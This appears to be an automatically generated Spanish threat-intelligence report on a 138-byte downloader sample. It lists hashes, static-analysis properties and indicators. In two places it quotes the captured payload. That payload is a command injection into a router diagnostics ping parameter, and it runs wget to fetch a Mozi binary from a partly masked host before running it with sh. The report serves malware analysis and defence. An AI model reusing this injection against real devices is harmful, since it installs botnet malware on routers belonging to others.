# 🧬 Payload Analysis

`94091e332aac2347f1efb966409e263f28c3b3280a7947d86f543647033acfd4`

## 📌 Resumen

Texto ASCII de 138 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://61.216.49.XXX:47103/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://61.216.49.XXX:47103/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/94091e332aac2347f1efb966409e263f28c3b3280a7947d86f543647033acfd4.md](../../../../../malware-like/oraculo/downloader/94091e332aac2347f1efb966409e263f28c3b3280a7947d86f543647033acfd4.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:10:51.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `94091e332aac2347f1efb966409e263f28c3b3280a7947d86f543647033acfd4`
- **SHA1:** `35f99275c66934edd9f90181d60b7934c77b51f1`
- **MD5:** `9c64a9151f44572811a0646398f7105f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 138 B |
| Entropía | 5.12 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.216.49.XXX:47103/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://61.216.49.XXX:47103/Mozi.m+-O+- | strings |
| ip | 61.216.49.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://61.216.49.XXX:47103/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | 94091e332aac2347f1efb966409e263f28c3b3280a7947d86f543647033acfd4 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
